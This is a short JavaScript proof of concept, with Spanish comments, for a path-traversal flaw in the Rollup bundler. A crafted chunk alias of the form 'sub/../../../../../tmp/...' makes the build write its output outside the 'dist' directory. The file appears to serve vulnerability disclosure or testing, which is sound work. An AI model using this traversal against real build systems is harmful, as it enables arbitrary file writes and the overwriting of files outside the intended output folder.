// innocent_script.js
const { rollup } = require('rollup');

async function runExploit() {
        const payloadChunkAlias = "sub/../../../../../tmp/archivo_escapado_poc";

        // compilar archivo de entrada
        const bundle = await rollup({
                input: {
                        [payloadChunkAlias]: 'src/index.js'
                }
        });

        // rollup procesa nombre con el path
        await bundle.write({
                dir: 'dist',
                entryFileNames: '[name].js',
                format: 'cjs'
        });
}

runExploit().catch(err => {
        console.error(err)
});
